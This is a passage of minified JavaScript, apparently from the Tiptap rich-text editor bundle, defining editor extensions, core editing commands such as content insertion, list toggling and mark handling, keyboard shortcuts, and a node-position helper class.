t=this.extensions;this.editor.extensionStorage=Object.fromEntries(t.map(e=>[e.name,e.storage])),t.forEach(e=>{var n;const r={name:e.name,options:e.options,storage:this.editor.extensionStorage[e.name],editor:this.editor,type:gf(e.name,this.schema)};e.type==="mark"&&((n=X(F(e,"keepOnSplit",r)))==null||n)&&this.splittableMarks.push(e.name);const i=F(e,"onBeforeCreate",r),s=F(e,"onCreate",r),o=F(e,"onUpdate",r),a=F(e,"onSelectionUpdate",r),l=F(e,"onTransaction",r),u=F(e,"onFocus",r),c=F(e,"onBlur",r),d=F(e,"onDestroy",r);i&&this.editor.on("beforeCreate",i),s&&this.editor.on("create",s),o&&this.editor.on("update",o),a&&this.editor.on("selectionUpdate",a),l&&this.editor.on("transaction",l),u&&this.editor.on("focus",u),c&&this.editor.on("blur",c),d&&this.editor.on("destroy",d)})}};rd.resolve=NE;rd.sort=Pg;rd.flatten=Ng;var hB={};bE(hB,{ClipboardTextSerializer:()=>_E,Commands:()=>UE,Delete:()=>WE,Drop:()=>KE,Editable:()=>qE,FocusEvents:()=>JE,Keymap:()=>YE,Paste:()=>QE,Tabindex:()=>XE,focusEventsPluginKey:()=>GE});var Ae=class zE extends Lg{constructor(){super(...arguments),this.type="extension"}static create(e={}){const n=typeof e=="function"?e():e;return new zE(n)}configure(e){return super.configure(e)}extend(e){const n=typeof e=="function"?e():e;return super.extend(n)}},_E=Ae.create({name:"clipboardTextSerializer",addOptions(){return{blockSeparator:void 0}},addProseMirrorPlugins(){return[new we({key:new ze("clipboardTextSerializer"),props:{clipboardTextSerializer:()=>{const{editor:t}=this,{state:e,schema:n}=t,{doc:r,selection:i}=e,{ranges:s}=i,o=Math.min(...s.map(c=>c.$from.pos)),a=Math.max(...s.map(c=>c.$to.pos)),l=PE(n);return AE(r,{from:o,to:a},{...this.options.blockSeparator!==void 0?{blockSeparator:this.options.blockSeparator}:{},textSerializers:l})}}})]}}),$E={};bE($E,{blur:()=>pB,clearContent:()=>mB,clearNodes:()=>gB,command:()=>yB,createParagraphNear:()=>xB,cut:()=>vB,deleteCurrentNode:()=>wB,deleteNode:()=>SB,deleteRange:()=>kB,deleteSelection:()=>bB,enter:()=>CB,exitCode:()=>EB,extendMarkRange:()=>TB,first:()=>MB,focus:()=>AB,forEach:()=>PB,insertContent:()=>RB,insertContentAt:()=>DB,joinBackward:()=>jB,joinDown:()=>IB,joinForward:()=>FB,joinItemBackward:()=>BB,joinItemForward:()=>VB,joinTextblockBackward:()=>zB,joinTextblockForward:()=>_B,joinUp:()=>LB,keyboardShortcut:()=>HB,lift:()=>UB,liftEmptyBlock:()=>WB,liftListItem:()=>KB,newlineInCode:()=>qB,resetAttributes:()=>GB,scrollIntoView:()=>JB,selectAll:()=>YB,selectNodeBackward:()=>QB,selectNodeForward:()=>XB,selectParentNode:()=>ZB,selectTextblockEnd:()=>eV,selectTextblockStart:()=>tV,setContent:()=>nV,setMark:()=>iV,setMeta:()=>sV,setNode:()=>oV,setNodeSelection:()=>aV,setTextSelection:()=>lV,sinkListItem:()=>uV,splitBlock:()=>cV,splitListItem:()=>dV,toggleList:()=>fV,toggleMark:()=>hV,toggleNode:()=>pV,toggleWrap:()=>mV,undoInputRule:()=>gV,unsetAllMarks:()=>yV,unsetMark:()=>xV,updateAttributes:()=>vV,wrapIn:()=>wV,wrapInList:()=>SV});var pB=()=>({editor:t,view:e})=>(requestAnimationFrame(()=>{var n;t.isDestroyed||(e.dom.blur(),(n=window==null?void 0:window.getSelection())==null||n.removeAllRanges())}),!0),mB=(t=!0)=>({commands:e})=>e.setContent("",{emitUpdate:t}),gB=()=>({state:t,tr:e,dispatch:n})=>{const{selection:r}=e,{ranges:i}=r;return n&&i.forEach(({$from:s,$to:o})=>{t.doc.nodesBetween(s.pos,o.pos,(a,l)=>{if(a.type.isText)return;const{doc:u,mapping:c}=e,d=u.resolve(c.map(l)),f=u.resolve(c.map(l+a.nodeSize)),h=d.blockRange(f);if(!h)return;const p=_s(h);if(a.type.isTextblock){const{defaultType:y}=d.parent.contentMatchAt(d.index());e.setNodeMarkup(h.start,y)}(p||p===0)&&e.lift(h,p)})}),!0},yB=t=>e=>t(e),xB=()=>({state:t,dispatch:e})=>EF(t,e),vB=(t,e)=>({editor:n,tr:r})=>{const{state:i}=n,s=i.doc.slice(t.from,t.to);r.deleteRange(t.from,t.to);const o=r.mapping.map(e);return r.insert(o,s.content),r.setSelection(new $(r.doc.resolve(Math.max(o-1,0)))),!0},wB=()=>({tr:t,dispatch:e})=>{const{selection:n}=t,r=n.$anchor.node();if(r.content.size>0)return!1;const i=t.selection.$anchor;for(let s=i.depth;s>0;s-=1)if(i.node(s).type===r.type){if(e){const a=i.before(s),l=i.after(s);t.delete(a,l).scrollIntoView()}return!0}return!1},SB=t=>({tr:e,state:n,dispatch:r})=>{const i=Ne(t,n.schema),s=e.selection.$anchor;for(let o=s.depth;o>0;o-=1)if(s.node(o).type===i){if(r){const l=s.before(o),u=s.after(o);e.delete(l,u).scrollIntoView()}return!0}return!1},kB=t=>({tr:e,dispatch:n})=>{const{from:r,to:i}=t;return n&&e.delete(r,i),!0},bB=()=>({state:t,dispatch:e})=>hF(t,e),CB=()=>({commands:t})=>t.keyboardShortcut("Enter"),EB=()=>({state:t,dispatch:e})=>CF(t,e),TB=(t,e={})=>({tr:n,state:r,dispatch:i})=>{const s=Jn(t,r.schema),{doc:o,selection:a}=n,{$from:l,from:u,to:c}=a;if(i){const d=Og(l,s,e);if(d&&d.from<=u&&d.to>=c){const f=$.create(o,d.from,d.to);n.setSelection(f)}}return!0},MB=t=>e=>{const n=typeof t=="function"?t(e):t;for(let r=0;r<n.length;r+=1)if(n[r](e))return!0;return!1};function NB(){return navigator.platform==="Android"||/android/i.test(navigator.userAgent)}function Ig(){return["iPad Simulator","iPhone Simulator","iPod Simulator","iPad","iPhone","iPod"].includes(navigator.platform)||navigator.userAgent.includes("Mac")&&"ontouchend"in document}var AB=(t=null,e={})=>({editor:n,view:r,tr:i,dispatch:s})=>{e={scrollIntoView:!0,...e};const o=()=>{(Ig()||NB())&&r.dom.focus(),requestAnimationFrame(()=>{n.isDestroyed||(r.focus(),e!=null&&e.scrollIntoView&&n.commands.scrollIntoView())})};if(r.hasFocus()&&t===null||t===!1)return!0;if(s&&t===null&&!jE(n.state.selection))return o(),!0;const a=FE(i.doc,t)||n.state.selection,l=n.state.selection.eq(a);return s&&(l||i.setSelection(a),l&&i.storedMarks&&i.setStoredMarks(i.storedMarks),o()),!0},PB=(t,e)=>n=>t.every((r,i)=>e(r,{...n,index:i})),RB=(t,e)=>({tr:n,commands:r})=>r.insertContentAt({from:n.selection.from,to:n.selection.to},t,e),OB=t=>!("type"in t),DB=(t,e,n)=>({tr:r,dispatch:i,editor:s})=>{var o;if(i){n={parseOptions:s.options.parseOptions,updateSelection:!0,applyInputRules:!1,applyPasteRules:!1,...n};let a;const{selection:l}=s.state,u=g=>{s.emit("contentError",{editor:s,error:g,disableCollaboration:()=>{"collaboration"in s.storage&&typeof s.storage.collaboration=="object"&&s.storage.collaboration&&(s.storage.collaboration.isDisabled=!0)}})},c={preserveWhitespace:"full",...n.parseOptions};if(!n.errorOnInvalidContent&&!s.options.enableContentCheck&&s.options.emitContentError)try{ya(e,s.schema,{parseOptions:c,errorOnInvalidContent:!0})}catch(g){u(g)}try{a=ya(e,s.schema,{parseOptions:c,errorOnInvalidContent:(o=n.errorOnInvalidContent)!=null?o:s.options.enableContentCheck})}catch(g){return u(g),!1}let{from:d,to:f}=typeof t=="number"?{from:t,to:t}:{from:t.from,to:t.to},h=!0,p=!0;if((OB(a)?a:[a]).forEach(g=>{g.check(),h=h?g.isText&&g.marks.length===0:!1,p=p?g.isBlock:!1}),d===f&&p){const{parent:g}=r.doc.resolve(d);g.isTextblock&&!g.type.spec.code&&!g.childCount&&(d-=1,f+=1)}let x;if(h){if(Array.isArray(e))x=e.map(g=>g.text||"").join("");else if(e instanceof A){let g="";e.forEach(v=>{v.text&&(g+=v.text)}),x=g}else typeof e=="object"&&e&&e.text?x=e.text:x=e;r.insertText(x,d,f)}else{x=a;const g=l.$from.parentOffset===0,v=l.$from.node().isText||l.$from.node().isTextblock,w=l.$from.node().content.size>0;g&&v&&w&&(d=Math.max(0,d-1)),r.replaceWith(d,f,x)}n.updateSelection&&rB(r,r.steps.length-1,-1),n.applyInputRules&&r.setMeta("applyInputRules",{from:d,text:x}),n.applyPasteRules&&r.setMeta("applyPasteRules",{from:d,text:x})}return!0},LB=()=>({state:t,dispatch:e})=>wF(t,e),IB=()=>({state:t,dispatch:e})=>SF(t,e),jB=()=>({state:t,dispatch:e})=>pF(t,e),FB=()=>({state:t,dispatch:e})=>xF(t,e),BB=()=>({state:t,dispatch:e,tr:n})=>{try{const r=Wc(t.doc,t.selection.$from.pos,-1);return r==null?!1:(n.join(r,2),e&&e(n),!0)}catch{return!1}},VB=()=>({state:t,dispatch:e,tr:n})=>{try{const r=Wc(t.doc,t.selection.$from.pos,1);return r==null?!1:(n.join(r,2),e&&e(n),!0)}catch{return!1}},zB=()=>({state:t,dispatch:e})=>mF(t,e),_B=()=>({state:t,dispatch:e})=>gF(t,e);function HE(){return typeof navigator<"u"?/Mac/.test(navigator.platform):!1}function $B(t){const e=t.split(/-(?!$)/);let n=e[e.length-1];n==="Space"&&(n=" ");let r,i,s,o;for(let a=0;a<e.length-1;a+=1){const l=e[a];if(/^(cmd|meta|m)$/i.test(l))o=!0;else if(/^a(lt)?$/i.test(l))r=!0;else if(/^(c|ctrl|control)$/i.test(l))i=!0;else if(/^s(hift)?$/i.test(l))s=!0;else if(/^mod$/i.test(l))Ig()||HE()?o=!0:i=!0;else throw new Error(`Unrecognized modifier name: ${l}`)}return r&&(n=`Alt-${n}`),i&&(n=`Ctrl-${n}`),o&&(n=`Meta-${n}`),s&&(n=`Shift-${n}`),n}var HB=t=>({editor:e,view:n,tr:r,dispatch:i})=>{const s=$B(t).split(/-(?!$)/),o=s.find(u=>!["Alt","Ctrl","Meta","Shift"].includes(u)),a=new KeyboardEvent("keydown",{key:o==="Space"?" ":o,altKey:s.includes("Alt"),ctrlKey:s.includes("Ctrl"),metaKey:s.includes("Meta"),shiftKey:s.includes("Shift"),bubbles:!0,cancelable:!0}),l=e.captureTransaction(()=>{n.someProp("handleKeyDown",u=>u(n,a))});return l==null||l.steps.forEach(u=>{const c=u.map(r.mapping);c&&i&&r.maybeStep(c)}),!0},UB=(t,e={})=>({state:n,dispatch:r})=>{const i=Ne(t,n.schema);return Lr(n,i,e)?kF(n,r):!1},WB=()=>({state:t,dispatch:e})=>TF(t,e),KB=t=>({state:e,dispatch:n})=>{const r=Ne(t,e.schema);return IF(r)(e,n)},qB=()=>({state:t,dispatch:e})=>bF(t,e);function Jv(t,e){const n=typeof e=="string"?[e]:e;return Object.keys(t).reduce((r,i)=>(n.includes(i)||(r[i]=t[i]),r),{})}var GB=(t,e)=>({tr:n,state:r,dispatch:i})=>{let s=null,o=null;const a=ed(typeof t=="string"?t:t.name,r.schema);return a?(a==="node"&&(s=Ne(t,r.schema)),a==="mark"&&(o=Jn(t,r.schema)),i&&n.selection.ranges.forEach(l=>{r.doc.nodesBetween(l.$from.pos,l.$to.pos,(u,c)=>{s&&s===u.type&&n.setNodeMarkup(c,void 0,Jv(u.attrs,e)),o&&u.marks.length&&u.marks.forEach(d=>{o===d.type&&n.addMark(c,c+u.nodeSize,o.create(Jv(d.attrs,e)))})})}),!0):!1},JB=()=>({tr:t,dispatch:e})=>(e&&t.scrollIntoView(),!0),YB=()=>({tr:t,dispatch:e})=>{if(e){const n=new Wt(t.doc);t.setSelection(n)}return!0},QB=()=>({state:t,dispatch:e})=>yF(t,e),XB=()=>({state:t,dispatch:e})=>vF(t,e),ZB=()=>({state:t,dispatch:e})=>MF(t,e),eV=()=>({state:t,dispatch:e})=>PF(t,e),tV=()=>({state:t,dispatch:e})=>AF(t,e),nV=(t,{errorOnInvalidContent:e,emitUpdate:n=!0,parseOptions:r={}}={})=>({editor:i,tr:s,dispatch:o,commands:a})=>{const{doc:l}=s;if(r.preserveWhitespace!=="full"){const u=up(t,i.schema,r,{errorOnInvalidContent:e??i.options.enableContentCheck});return o&&s.replaceWith(0,l.content.size,u).setMeta("preventUpdate",!n),!0}return o&&s.setMeta("preventUpdate",!n),a.insertContentAt({from:0,to:l.content.size},t,{parseOptions:r,errorOnInvalidContent:e??i.options.enableContentCheck})};function rV(t,e,n){var r;const{selection:i}=e;let s=null;if(jE(i)&&(s=i.$cursor),s){const a=(r=t.storedMarks)!=null?r:s.marks();return!!n.isInSet(a)||!a.some(l=>l.type.excludes(n))}const{ranges:o}=i;return o.some(({$from:a,$to:l})=>{let u=a.depth===0?t.doc.inlineContent&&t.doc.type.allowsMarkType(n):!1;return t.doc.nodesBetween(a.pos,l.pos,(c,d,f)=>{if(u)return!1;if(c.isInline){const h=!f||f.type.allowsMarkType(n),p=!!n.isInSet(c.marks)||!c.marks.some(y=>y.type.excludes(n));u=h&&p}return!u}),u})}var iV=(t,e={})=>({tr:n,state:r,dispatch:i})=>{const{selection:s}=n,{empty:o,ranges:a}=s,l=Jn(t,r.schema);if(i)if(o){const u=RE(r,l);n.addStoredMark(l.create({...u,...e}))}else a.forEach(u=>{const c=u.$from.pos,d=u.$to.pos;r.doc.nodesBetween(c,d,(f,h)=>{const p=Math.max(h,c),y=Math.min(h+f.nodeSize,d);f.marks.find(g=>g.type===l)?f.marks.forEach(g=>{l===g.type&&n.addMark(p,y,l.create({...g.attrs,...e}))}):n.addMark(p,y,l.create(e))})});return rV(r,n,l)},sV=(t,e)=>({tr:n})=>(n.setMeta(t,e),!0),oV=(t,e={})=>({state:n,dispatch:r,chain:i})=>{const s=Ne(t,n.schema);let o;return n.selection.$anchor.sameParent(n.selection.$head)&&(o=n.selection.$anchor.parent.attrs),s.isTextblock?i().command(({commands:a})=>Hv(s,{...o,...e})(n)?!0:a.clearNodes()).command(({state:a})=>Hv(s,{...o,...e})(a,r)).run():(console.warn('[tiptap warn]: Currently "setNode()" only supports text block nodes.'),!1)},aV=t=>({tr:e,dispatch:n})=>{if(n){const{doc:r}=e,i=ni(t,0,r.content.size),s=V.create(r,i);e.setSelection(s)}return!0},lV=t=>({tr:e,dispatch:n})=>{if(n){const{doc:r}=e,{from:i,to:s}=typeof t=="number"?{from:t,to:t}:t,o=$.atStart(r).from,a=$.atEnd(r).to,l=ni(i,o,a),u=ni(s,o,a),c=$.create(r,l,u);e.setSelection(c)}return!0},uV=t=>({state:e,dispatch:n})=>{const r=Ne(t,e.schema);return BF(r)(e,n)};function Yv(t,e){const n=t.storedMarks||t.selection.$to.parentOffset&&t.selection.$from.marks();if(n){const r=n.filter(i=>e==null?void 0:e.includes(i.type.name));t.tr.ensureMarks(r)}}var cV=({keepMarks:t=!0}={})=>({tr:e,state:n,dispatch:r,editor:i})=>{const{selection:s,doc:o}=e,{$from:a,$to:l}=s,u=i.extensionManager.attributes,c=Wl(u,a.node().type.name,a.node().attrs);if(s instanceof V&&s.node.isBlock)return!a.parentOffset||!cs(o,a.pos)?!1:(r&&(t&&Yv(n,i.extensionManager.splittableMarks),e.split(a.pos).scrollIntoView()),!0);if(!a.parent.isBlock)return!1;const d=l.parentOffset===l.parent.content.size,f=a.depth===0?void 0:_F(a.node(-1).contentMatchAt(a.indexAfter(-1)));let h=d&&f?[{type:f,attrs:c}]:void 0,p=cs(e.doc,e.mapping.map(a.pos),1,h);if(!h&&!p&&cs(e.doc,e.mapping.map(a.pos),1,f?[{type:f}]:void 0)&&(p=!0,h=f?[{type:f,attrs:c}]:void 0),r){if(p&&(s instanceof $&&e.deleteSelection(),e.split(e.mapping.map(a.pos),1,h),f&&!d&&!a.parentOffset&&a.parent.type!==f)){const y=e.mapping.map(a.before()),x=e.doc.resolve(y);a.node(-1).canReplaceWith(x.index(),x.index()+1,f)&&e.setNodeMarkup(e.mapping.map(a.before()),f)}t&&Yv(n,i.extensionManager.splittableMarks),e.scrollIntoView()}return p},dV=(t,e={})=>({tr:n,state:r,dispatch:i,editor:s})=>{var o;const a=Ne(t,r.schema),{$from:l,$to:u}=r.selection,c=r.selection.node;if(c&&c.isBlock||l.depth<2||!l.sameParent(u))return!1;const d=l.node(-1);if(d.type!==a)return!1;const f=s.extensionManager.attributes;if(l.parent.content.size===0&&l.node(-1).childCount===l.indexAfter(-1)){if(l.depth===2||l.node(-3).type!==a||l.index(-2)!==l.node(-2).childCount-1)return!1;if(i){let g=A.empty;const v=l.index(-1)?1:l.index(-2)?2:3;for(let C=l.depth-v;C>=l.depth-3;C-=1)g=A.from(l.node(C).copy(g));const w=l.indexAfter(-1)<l.node(-2).childCount?1:l.indexAfter(-2)<l.node(-3).childCount?2:3,b={...Wl(f,l.node().type.name,l.node().attrs),...e},k=((o=a.contentMatch.defaultType)==null?void 0:o.createAndFill(b))||void 0;g=g.append(A.from(a.createAndFill(null,k)||void 0));const E=l.before(l.depth-(v-1));n.replace(E,l.after(-w),new L(g,4-v,0));let M=-1;n.doc.nodesBetween(E,n.doc.content.size,(C,N)=>{if(M>-1)return!1;C.isTextblock&&C.content.size===0&&(M=N+1)}),M>-1&&n.setSelection($.near(n.doc.resolve(M))),n.scrollIntoView()}return!0}const h=u.pos===l.end()?d.contentMatchAt(0).defaultType:null,p={...Wl(f,d.type.name,d.attrs),...e},y={...Wl(f,l.node().type.name,l.node().attrs),...e};n.delete(l.pos,u.pos);const x=h?[{type:a,attrs:p},{type:h,attrs:y}]:[{type:a,attrs:p}];if(!cs(n.doc,l.pos,2))return!1;if(i){const{selection:g,storedMarks:v}=r,{splittableMarks:w}=s.extensionManager,b=v||g.$to.parentOffset&&g.$from.marks();if(n.split(l.pos,2,x).scrollIntoView(),!b||!i)return!0;const k=b.filter(E=>w.includes(E.type.name));n.ensureMarks(k)}return!0},yf=(t,e)=>{const n=Zc(o=>o.type===e)(t.selection);if(!n)return!0;const r=t.doc.resolve(Math.max(0,n.pos-1)).before(n.depth);if(r===void 0)return!0;const i=t.doc.nodeAt(r);return n.node.type===(i==null?void 0:i.type)&&Vr(t.doc,n.pos)&&t.join(n.pos),!0},xf=(t,e)=>{const n=Zc(o=>o.type===e)(t.selection);if(!n)return!0;const r=t.doc.resolve(n.start).after(n.depth);if(r===void 0)return!0;const i=t.doc.nodeAt(r);return n.node.type===(i==null?void 0:i.type)&&Vr(t.doc,r)&&t.join(r),!0},fV=(t,e,n,r={})=>({editor:i,tr:s,state:o,dispatch:a,chain:l,commands:u,can:c})=>{const{extensions:d,splittableMarks:f}=i.extensionManager,h=Ne(t,o.schema),p=Ne(e,o.schema),{selection:y,storedMarks:x}=o,{$from:g,$to:v}=y,w=g.blockRange(v),b=x||y.$to.parentOffset&&y.$from.marks();if(!w)return!1;const k=Zc(E=>Gv(E.type.name,d))(y);if(w.depth>=1&&k&&w.depth-k.depth<=1){if(k.node.type===h)return u.liftListItem(p);if(Gv(k.node.type.name,d)&&h.validContent(k.node.content)&&a)return l().command(()=>(s.setNodeMarkup(k.pos,h),!0)).command(()=>yf(s,h)).command(()=>xf(s,h)).run()}return!n||!b||!a?l().command(()=>c().wrapInList(h,r)?!0:u.clearNodes()).wrapInList(h,r).command(()=>yf(s,h)).command(()=>xf(s,h)).run():l().command(()=>{const E=c().wrapInList(h,r),M=b.filter(C=>f.includes(C.type.name));return s.ensureMarks(M),E?!0:u.clearNodes()}).wrapInList(h,r).command(()=>yf(s,h)).command(()=>xf(s,h)).run()},hV=(t,e={},n={})=>({state:r,commands:i})=>{const{extendEmptyMarkRange:s=!1}=n,o=Jn(t,r.schema);return cp(r,o,e)?i.unsetMark(o,{extendEmptyMarkRange:s}):i.setMark(o,e)},pV=(t,e,n={})=>({state:r,commands:i})=>{const s=Ne(t,r.schema),o=Ne(e,r.schema),a=Lr(r,s,n);let l;return r.selection.$anchor.sameParent(r.selection.$head)&&(l=r.selection.$anchor.parent.attrs),a?i.setNode(o,l):i.setNode(s,{...l,...n})},mV=(t,e={})=>({state:n,commands:r})=>{const i=Ne(t,n.schema);return Lr(n,i,e)?r.lift(i):r.wrapIn(i,e)},gV=()=>({state:t,dispatch:e})=>{const n=t.plugins;for(let r=0;r<n.length;r+=1){const i=n[r];let s;if(i.spec.isInputRules&&(s=i.getState(t))){if(e){const o=t.tr,a=s.transform;for(let l=a.steps.length-1;l>=0;l-=1)o.step(a.steps[l].invert(a.docs[l]));if(s.text){const l=o.doc.resolve(s.from).marks();o.replaceWith(s.from,s.to,t.schema.text(s.text,l))}else o.delete(s.from,s.to)}return!0}}return!1},yV=()=>({tr:t,dispatch:e})=>{const{selection:n}=t,{empty:r,ranges:i}=n;return r||e&&i.forEach(s=>{t.removeMark(s.$from.pos,s.$to.pos)}),!0},xV=(t,e={})=>({tr:n,state:r,dispatch:i})=>{var s;const{extendEmptyMarkRange:o=!1}=e,{selection:a}=n,l=Jn(t,r.schema),{$from:u,empty:c,ranges:d}=a;if(!i)return!0;if(c&&o){let{from:f,to:h}=a;const p=(s=u.marks().find(x=>x.type===l))==null?void 0:s.attrs,y=Og(u,l,p);y&&(f=y.from,h=y.to),n.removeMark(f,h,l)}else d.forEach(f=>{n.removeMark(f.$from.pos,f.$to.pos,l)});return n.removeStoredMark(l),!0},vV=(t,e={})=>({tr:n,state:r,dispatch:i})=>{let s=null,o=null;const a=ed(typeof t=="string"?t:t.name,r.schema);return a?(a==="node"&&(s=Ne(t,r.schema)),a==="mark"&&(o=Jn(t,r.schema)),i&&n.selection.ranges.forEach(l=>{const u=l.$from.pos,c=l.$to.pos;let d,f,h,p;n.selection.empty?r.doc.nodesBetween(u,c,(y,x)=>{s&&s===y.type&&(h=Math.max(x,u),p=Math.min(x+y.nodeSize,c),d=x,f=y)}):r.doc.nodesBetween(u,c,(y,x)=>{x<u&&s&&s===y.type&&(h=Math.max(x,u),p=Math.min(x+y.nodeSize,c),d=x,f=y),x>=u&&x<=c&&(s&&s===y.type&&n.setNodeMarkup(x,void 0,{...y.attrs,...e}),o&&y.marks.length&&y.marks.forEach(g=>{if(o===g.type){const v=Math.max(x,u),w=Math.min(x+y.nodeSize,c);n.addMark(v,w,o.create({...g.attrs,...e}))}}))}),f&&(d!==void 0&&n.setNodeMarkup(d,void 0,{...f.attrs,...e}),o&&f.marks.length&&f.marks.forEach(y=>{o===y.type&&n.addMark(h,p,o.create({...y.attrs,...e}))}))}),!0):!1},wV=(t,e={})=>({state:n,dispatch:r})=>{const i=Ne(t,n.schema);return RF(i,e)(n,r)},SV=(t,e={})=>({state:n,dispatch:r})=>{const i=Ne(t,n.schema);return OF(i,e)(n,r)},UE=Ae.create({name:"commands",addCommands(){return{...$E}}}),WE=Ae.create({name:"delete",onUpdate({transaction:t,appendedTransactions:e}){var n,r,i;const s=()=>{var o,a,l,u;if((u=(l=(a=(o=this.editor.options.coreExtensionOptions)==null?void 0:o.delete)==null?void 0:a.filterTransaction)==null?void 0:l.call(a,t))!=null?u:t.getMeta("y-sync$"))return;const c=CE(t.before,[t,...e]);DE(c).forEach(h=>{c.mapping.mapResult(h.oldRange.from).deletedAfter&&c.mapping.mapResult(h.oldRange.to).deletedBefore&&c.before.nodesBetween(h.oldRange.from,h.oldRange.to,(p,y)=>{const x=y+p.nodeSize-2,g=h.oldRange.from<=y&&x<=h.oldRange.to;this.editor.emit("delete",{type:"node",node:p,from:y,to:x,newFrom:c.mapping.map(y),newTo:c.mapping.map(x),deletedRange:h.oldRange,newRange:h.newRange,partial:!g,editor:this.editor,transaction:t,combinedTransform:c})})});const f=c.mapping;c.steps.forEach((h,p)=>{var y,x;if(h instanceof tn){const g=f.slice(p).map(h.from,-1),v=f.slice(p).map(h.to),w=f.invert().map(g,-1),b=f.invert().map(v),k=(y=c.doc.nodeAt(g-1))==null?void 0:y.marks.some(M=>M.eq(h.mark)),E=(x=c.doc.nodeAt(v))==null?void 0:x.marks.some(M=>M.eq(h.mark));this.editor.emit("delete",{type:"mark",mark:h.mark,from:h.from,to:h.to,deletedRange:{from:w,to:b},newRange:{from:g,to:v},partial:!!(E||k),editor:this.editor,transaction:t,combinedTransform:c})}})};(i=(r=(n=this.editor.options.coreExtensionOptions)==null?void 0:n.delete)==null?void 0:r.async)==null||i?setTimeout(s,0):s()}}),KE=Ae.create({name:"drop",addProseMirrorPlugins(){return[new we({key:new ze("tiptapDrop"),props:{handleDrop:(t,e,n,r)=>{this.editor.emit("drop",{editor:this.editor,event:e,slice:n,moved:r})}}})]}}),qE=Ae.create({name:"editable",addProseMirrorPlugins(){return[new we({key:new ze("editable"),props:{editable:()=>this.editor.options.editable}})]}}),GE=new ze("focusEvents"),JE=Ae.create({name:"focusEvents",addProseMirrorPlugins(){const{editor:t}=this;return[new we({key:GE,props:{handleDOMEvents:{focus:(e,n)=>{t.isFocused=!0;const r=t.state.tr.setMeta("focus",{event:n}).setMeta("addToHistory",!1);return e.dispatch(r),!1},blur:(e,n)=>{t.isFocused=!1;const r=t.state.tr.setMeta("blur",{event:n}).setMeta("addToHistory",!1);return e.dispatch(r),!1}}}})]}}),YE=Ae.create({name:"keymap",addKeyboardShortcuts(){const t=()=>this.editor.commands.first(({commands:o})=>[()=>o.undoInputRule(),()=>o.command(({tr:a})=>{const{selection:l,doc:u}=a,{empty:c,$anchor:d}=l,{pos:f,parent:h}=d,p=d.parent.isTextblock&&f>0?a.doc.resolve(f-1):d,y=p.parent.type.spec.isolating,x=d.pos-d.parentOffset,g=y&&p.parent.childCount===1?x===d.pos:W.atStart(u).from===f;return!c||!h.type.isTextblock||h.textContent.length||!g||g&&d.parent.type.name==="paragraph"?!1:o.clearNodes()}),()=>o.deleteSelection(),()=>o.joinBackward(),()=>o.selectNodeBackward()]),e=()=>this.editor.commands.first(({commands:o})=>[()=>o.deleteSelection(),()=>o.deleteCurrentNode(),()=>o.joinForward(),()=>o.selectNodeForward()]),r={Enter:()=>this.editor.commands.first(({commands:o})=>[()=>o.newlineInCode(),()=>o.createParagraphNear(),()=>o.liftEmptyBlock(),()=>o.splitBlock()]),"Mod-Enter":()=>this.editor.commands.exitCode(),Backspace:t,"Mod-Backspace":t,"Shift-Backspace":t,Delete:e,"Mod-Delete":e,"Mod-a":()=>this.editor.commands.selectAll()},i={...r},s={...r,"Ctrl-h":t,"Alt-Backspace":t,"Ctrl-d":e,"Ctrl-Alt-Backspace":e,"Alt-Delete":e,"Alt-d":e,"Ctrl-a":()=>this.editor.commands.selectTextblockStart(),"Ctrl-e":()=>this.editor.commands.selectTextblockEnd()};return Ig()||HE()?s:i},addProseMirrorPlugins(){return[new we({key:new ze("clearDocument"),appendTransaction:(t,e,n)=>{if(t.some(y=>y.getMeta("composition")))return;const r=t.some(y=>y.docChanged)&&!e.doc.eq(n.doc),i=t.some(y=>y.getMeta("preventClearDocument"));if(!r||i)return;const{empty:s,from:o,to:a}=e.selection,l=W.atStart(e.doc).from,u=W.atEnd(e.doc).to;if(s||!(o===l&&a===u)||!td(n.doc))return;const f=n.tr,h=Qc({state:n,transaction:f}),{commands:p}=new Xc({editor:this.editor,state:h});if(p.clearNodes(),!!f.steps.length)return f}})]}}),QE=Ae.create({name:"paste",addProseMirrorPlugins(){return[new we({key:new ze("tiptapPaste"),props:{handlePaste:(t,e,n)=>{this.editor.emit("paste",{editor:this.editor,event:e,slice:n})}}})]}}),XE=Ae.create({name:"tabindex",addProseMirrorPlugins(){return[new we({key:new ze("tabindex"),props:{attributes:()=>this.editor.isEditable?{tabindex:"0"}:{}}})]}}),kV=class ji{constructor(e,n,r=!1,i=null){this.currentNode=null,this.actualDepth=null,this.isBlock=r,this.resolvedPos=e,this.editor=n,this.currentNode=i}get name(){return this.node.type.name}get node(){return this.currentNode||this.resolvedPos.node()}get element(){return this.editor.view.domAtPos(this.pos).node}get depth(){var e;return(e=this.actualDepth)!=null?e:this.resolvedPos.depth}get pos(){return this.resolvedPos.pos}get content(){return this.node.content}set content(e){let n=this.from,r=this.to;if(this.isBlock){if(this.content.size===0){console.error(`You cant set content on a block node. Tried to set content on ${this.name} at ${this.pos}`);return}n=this.from+1,r=this.to-1}this.editor.commands.insertContentAt({from:n,to:r},e)}get attributes(){return this.node.attrs}get textContent(){return this.node.textContent}get size(){return this.node.nodeSize}get from(){return this.isBlock?this.pos:this.resolvedPos.start(this.resolvedPos.depth)}get range(){return{from:this.from,to:this.to}}get to(){return this.isBlock?this.pos+this.size:this.resolvedPos.end(this.resolvedPos.depth)+(this.node.isText?0:1)}get parent(){if(this.depth===0)return null;const e=this.resolvedPos.start(this.resolvedPos.depth-1),n=this.resolvedPos.doc.resolve(e);return new ji(n,this.editor)}get before(){let e=this.resolvedPos.doc.resolve(this.from-(this.isBlock?1:2));return e.depth!==this.depth&&(e=this.resolvedPos.doc.resolve(this.from-3)),new ji(e,this.editor)}get after(){let e=this.resolvedPos.doc.resolve(this.to+(this.isBlock?2:1));return e.depth!==this.depth&&(e=this.resolvedPos.doc.resolve(this.to+3)),new ji(e,this.editor)}get children(){const e=[];return this.node.content.forEach((n,r)=>{const i=n.isBlock&&!n.isTextblock,s=n.isAtom&&!n.isText,o=this.pos+r+(s?0:1);if(o<0||o>this.resolvedPos.doc.nodeSize-2)return;const a=this.resolvedPos.doc.resolve(o);if(!i&&a.depth<=this.depth)return;const l=new ji(a,this.editor,i,i?n:null);i&&(l.actualDepth=this.depth+1),e.push(new ji(a,this.editor,i,i?n:null))}),e}get firstChild(){return this.children[0]||null}get lastChild(){const e=this.children;return e[e.length-1]||null}closest(e,n={}){let r=null,i=this.parent;for(;i&&!r;){if(i.node.type.name===e)if(Object.keys(n).length>0){const s=i.node.attrs,o=Object.keys(n);for(let a=0;a<o.length;a+=1){const 